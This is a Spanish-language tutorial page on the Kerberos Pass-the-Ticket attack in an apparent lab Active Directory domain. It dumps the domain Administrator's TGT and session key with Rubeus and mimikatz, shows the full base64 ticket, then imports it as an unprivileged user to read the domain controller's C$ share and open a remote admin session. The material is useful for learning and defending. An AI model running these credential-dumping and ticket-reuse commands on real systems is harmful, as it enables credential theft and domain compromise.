---
icon: tickets-perforated
---

# Pass-The-Ticket

Esta tecnica se tiene que realizar con un usuario `administrador` local para asi poder obtener de primeras los `tickets` que estan en memoria de los usuarios tanto de dominio como locales, con este volcado podremos identificar el `ticket` que nos inetersa que en nuestro caso seria el de `administrador` y poderlo utilizar para lo siguiente:

Abriremos una `PowerShell` como `administrador` local:

```powershell
cd C:\Users\empleado1\Desktop\Rubeus-master\Rubeus\bin\Debug
.\Rubeus.exe dump
```

Info:

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2


Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x75991

  UserName                 : Administrator
  Domain                   : CORP
  LogonId                  : 0x598e8b
  UserSID                  : S-1-5-21-3352250647-938130414-2449934813-500
  AuthenticationPackage    : Kerberos
  LogonType                : Interactive
  LogonTime                : 21/01/2025 10:28:20
  LogonServer              : DC01
  LogonServerDNSDomain     : CORP.LOCAL
  UserPrincipalName        : Administrator@corp.local


    ServiceName              :  krbtgt/CORP.LOCAL
    ServiceRealm             :  CORP.LOCAL
    UserName                 :  Administrator (NT_PRINCIPAL)
    UserRealm                :  CORP.LOCAL
    StartTime                :  21/01/2025 10:28:20
    EndTime                  :  21/01/2025 20:28:20
    RenewTill                :  28/01/2025 10:28:20
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  1haTvwEUVP06GAVOv9tgQs1SEXodWp7P9oXQ0d3VNDk=
    Base64EncodedTicket   :

      doIFODCCBTSgAwIBBaEDAgEWooIEPjCCBDphggQ2MIIEMqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUyjggP6MIID9qADAgESoQMCAQKiggPoBIID5AMyKDiLVLYEwQzG/4Cu4SkPpUx19tbz5NumDn6fNfQYttf9jgFQQl7Sj0fmyFMyfwbR+q7hY17MXkWqIytvoHNbLhIX7q9oBoCPyGitWk3KWsQM5xM+MjAzhRozElkZrIRUzOCNuO2XXaXTNRPt/TVRnviKcQkw7TVNyjavfiF6epEX8lBMj/H75nYLvT1Pu2514VCeWvgF6P5cMWzm1hp3dYJunK3UgsmWZVRmNes7htUI13AvA7dioiQeetOVVi0m+QtP6SErAziEvHzRWqjlXXKHIJ4ojTCErl3Xni7Beao+6ObVFXppVPs00R3foKETDb2yOfFwDGioflAIkW2vFMYG1RZ2g/gf8OvoUAIdaDKPi0Tsien576MFRDO1N0Zb+r35YBGe3r4Ln3q4wKfv8Hx7Nwrr9VZihoMXcS/Z5XMG+Sg+Gz9dz3A619bC2Ym/MnqEKY+QNKraFeqY14JydkKM3W7N67r/odrqS1JtDlttvZaxjsDx/eeCFZjcCxyD2XHT49fSVYvH+xrjVgB2PiQBWhqg85RCJFXvGtkjkXkWEdm/wUvcI/S7Sh0K0yNsMbQ92OCxl4tl2HSiTJ31WYNY/op3H0Xi5lGXfCWHHKQY2eQldSx0c9W/ZZGyc+m3aYYv+sIBa5qNCyWj4r309FmzDXmA+ODl7Wo7Xb/wy5ZL6RcdohuEwF7rYdOPvy5lw3redegdhgvz3iGltzDmhr5NWFQXyOv77Zt821oyy3W7hcp6NEFQDCT8QvwnQrblJnutU3ByANqADDsICX/+i5Ih3EFWjmUa5kewkPfzQ5H09sQaffPLXUsJuCVuQ0oQ6vYifwaQS7MlWiZEf8hWm6kbTLM+g07y+pDt6H6MLtIlYrI/nScalqfiVC3Mc3CSQzhS5a5nNykPtmGPaHZAmOFBO8iR1eoX1RdnOcvscRnn5vmf2ESLpoD1U5so/tW+Utfb676hN8N5LzrxAyJn9n661Owpvbl2AzOfPw4SKYIiCCLBkTEMX7I1GewmJX6mJvt/PcOmnl2Lgt3UsJ+g30Nm1RQJWIfq3I0rwWv1sUvBGtsGoae3U1YySL0Z7SOeqhVT5mO6i2FhNdwoGcK7SUE5QUCQTUD6xZVinRXP//5jTg13R+Y+W7lSt0fBEBbkrEeWyvLXl2koMLhpdhL6XP5z7PoOLvltNOqos4Ih+4WS5Pto1mXpEOkQ+Fuuy+kIBcRMU9rqZj6U3MxLxRhazUSQn6a7DFH47Ar3vIC+wJYEFggFF2lWNGOFlei2AqhGteVb70x68Sn74H/tuOOAGm/u/MRr7uwLF7pUZl0XYZH8eaOB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEINYWk78BFFT9OhgFTr/bYELNUhF6HVqez/aF0NHd1TQ5oQwbCkNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjUwMTIxMDkyODIwWqYRGA8yMDI1MDEyMTE5MjgyMFqnERgPMjAyNTAxMjgwOTI4MjBaqAwbCkNPUlAuTE9DQUypHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUw=
.................................<RESTO_CODIGO>...................................
```

Mucha gente en internet comenta que copiando este `TGT` a nombre del usuario `administrador` ya podremos solicitar `Tickets` de servicio a su nombre, pero no es del todo cierto ya que nos faltaria la `clave de sesion` del usuario `administrador`, `Rubeus` nos propociona este `TGT` del usuario `administrador` pero dentro del mismo tambien esta la `clave de sesion` de dicho usuario, de momento lo dejaremos ahi en segundo plano y vamos a ver con la herramienta `mimikatz` como se vuelca esta informacion mas la `clave de sesion` que nosotros necesitamos.

Ejecutamos `mimikatz`:

```powershell
sekurlsa::tickets
```

Info:

```
Authentication Id : 0 ; 5869195 (00000000:00598e8b)
Session           : Interactive from 0
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 21/01/2025 10:28:20
SID               : S-1-5-21-3352250647-938130414-2449934813-500

         * Username : Administrator
         * Domain   : CORP.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 21/01/2025 10:28:20 ; 21/01/2025 20:28:20 ; 28/01/2025 10:28:20
           Service Name (02) : krbtgt ; CORP.LOCAL ; @ CORP.LOCAL
           Target Name  (02) : krbtgt ; CORP ; @ CORP.LOCAL
           Client Name  (01) : Administrator ; @ CORP.LOCAL ( CORP )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             d61693bf011454fd3a18054ebfdb6042cd52117a1d5a9ecff685d0d1ddd53439
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
.................................<RESTO_CODIGO>...................................
```

Pues aqui vemos que nos vuelca a parte del `ticket` la `session key` que es la que `Rubeus` nos vuelca pero todo de golpe en un paquete cifrado.

```
Session Key       : 0x00000001 - des_cbc_crc
Ticket            : 0x00000012 - aes256_hmac
```

Ahora lo que nosotros podemos hacer es `reinyectar` ese `ticket` en memoria para otra sesion otra `logon session` de un usuario distinta al usuario `administrador`.

La diferencia del `pth` es que con esta informacion obtenida del `ticket` al igual que haciamos antes en un `pth` nosotros nos podemos ir a otro sistema, otro equipo en el que no tengamos ningun privilegio de nada, por ejemplo abriendo un `PowerShell` sin ningun tipo de privilegios de `administrador` local, ni de dominio y poder realizar esta tecnica `ptt` sin requerir ningun privilegio de `administrador`.

Acordemonos de que teniamos el `ticket` que nos proporciono `Rubeus`, y con ese `Ticket` lo que podemos hacer es reinyectarnoslo en otro equipo o usuario que no tengamos privilegios de `administrador` para solicitar `Tickets` de servicio consumiendo dichos servicios con dicho usuario en nombre del usuario `administrador`.

Abriremos una `PowerShell` como usuario normal y utilizaremos `Rubeus` para realizar esta tecnica sin ningun tipo de privilegio:

```powershell
cd C:\Users\empleado1\Desktop\Rubeus-master\Rubeus\bin\Debug
.\Rubeus.exe ptt /ticket:doIFODCCBTSgAwIBBaEDAgEWooIEPjCCBDphggQ2MIIEMqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUyjggP6MIID9qADAgESoQMCAQKiggPoBIID5AMyKDiLVLYEwQzG/4Cu4SkPpUx19tbz5NumDn6fNfQYttf9jgFQQl7Sj0fmyFMyfwbR+q7hY17MXkWqIytvoHNbLhIX7q9oBoCPyGitWk3KWsQM5xM+MjAzhRozElkZrIRUzOCNuO2XXaXTNRPt/TVRnviKcQkw7TVNyjavfiF6epEX8lBMj/H75nYLvT1Pu2514VCeWvgF6P5cMWzm1hp3dYJunK3UgsmWZVRmNes7htUI13AvA7dioiQeetOVVi0m+QtP6SErAziEvHzRWqjlXXKHIJ4ojTCErl3Xni7Beao+6ObVFXppVPs00R3foKETDb2yOfFwDGioflAIkW2vFMYG1RZ2g/gf8OvoUAIdaDKPi0Tsien576MFRDO1N0Zb+r35YBGe3r4Ln3q4wKfv8Hx7Nwrr9VZihoMXcS/Z5XMG+Sg+Gz9dz3A619bC2Ym/MnqEKY+QNKraFeqY14JydkKM3W7N67r/odrqS1JtDlttvZaxjsDx/eeCFZjcCxyD2XHT49fSVYvH+xrjVgB2PiQBWhqg85RCJFXvGtkjkXkWEdm/wUvcI/S7Sh0K0yNsMbQ92OCxl4tl2HSiTJ31WYNY/op3H0Xi5lGXfCWHHKQY2eQldSx0c9W/ZZGyc+m3aYYv+sIBa5qNCyWj4r309FmzDXmA+ODl7Wo7Xb/wy5ZL6RcdohuEwF7rYdOPvy5lw3redegdhgvz3iGltzDmhr5NWFQXyOv77Zt821oyy3W7hcp6NEFQDCT8QvwnQrblJnutU3ByANqADDsICX/+i5Ih3EFWjmUa5kewkPfzQ5H09sQaffPLXUsJuCVuQ0oQ6vYifwaQS7MlWiZEf8hWm6kbTLM+g07y+pDt6H6MLtIlYrI/nScalqfiVC3Mc3CSQzhS5a5nNykPtmGPaHZAmOFBO8iR1eoX1RdnOcvscRnn5vmf2ESLpoD1U5so/tW+Utfb676hN8N5LzrxAyJn9n661Owpvbl2AzOfPw4SKYIiCCLBkTEMX7I1GewmJX6mJvt/PcOmnl2Lgt3UsJ+g30Nm1RQJWIfq3I0rwWv1sUvBGtsGoae3U1YySL0Z7SOeqhVT5mO6i2FhNdwoGcK7SUE5QUCQTUD6xZVinRXP//5jTg13R+Y+W7lSt0fBEBbkrEeWyvLXl2koMLhpdhL6XP5z7PoOLvltNOqos4Ih+4WS5Pto1mXpEOkQ+Fuuy+kIBcRMU9rqZj6U3MxLxRhazUSQn6a7DFH47Ar3vIC+wJYEFggFF2lWNGOFlei2AqhGteVb70x68Sn74H/tuOOAGm/u/MRr7uwLF7pUZl0XYZH8eaOB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEINYWk78BFFT9OhgFTr/bYELNUhF6HVqez/aF0NHd1TQ5oQwbCkNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjUwMTIxMDkyODIwWqYRGA8yMDI1MDEyMTE5MjgyMFqnERgPMjAyNTAxMjgwOTI4MjBaqAwbCkNPUlAuTE9DQUypHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUw=
```

Info:

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

Y veremos que el `Ticket` se importo con exito.

Ahora si en `PowerShell` ponemos el siguiente comando para ver los `Tickets` que tenemos con el usuario actual, veremos lo siguiente:

```powershell
klist
```

Info:

```
El id. de inicio de sesión actual es 0:0x759ab

Vales almacenados en caché: (1)

#0>     Cliente: Administrator @ CORP.LOCAL
        Servidor: krbtgt/CORP.LOCAL @ CORP.LOCAL
        Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
        Marcas de vale 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Hora de inicio: 1/21/2025 10:28:20 (local)
        Hora de finalización:   1/21/2025 20:28:20 (local)
        Hora de renovación: 1/28/2025 10:28:20 (local)
        Tipo de clave de sesión: AES-256-CTS-HMAC-SHA1-96
        Marcas de caché: 0x1 -> PRIMARY
        KDC llamado:
```

Vemos que tenemos el `Ticket` del usuario `Administrador`, por lo que funciono correctamente todo.

Si por ejemplo ponemos lo siguiente:

```powershell
dir \\DC01\c$
```

Veremos que nos deja listarlo, ya que nos estamos haciendo pasar por el usuario `administrador`.

Tambien si hacemos lo siguiente para obtener una sesion remota como el usuario `Administrador` utilizando este `Ticket` que nos hemos importado con exito, veremos que funciona:

```powershell
Enter-PSSession -ComputerName DC01
```

Info:

```
[DC01]: PS C:\Users\Administrator\Documents> whoami
corp\administrator
```

Veremos que funciona correctamente.

Si ahora por ejemplo reiniciamos el equipo, nos solicitara de nuevo el `TGT` pero del usuario `empelado1` por lo que tendriamos que importarnos nuevamente ese `Ticket` de `administrador`.
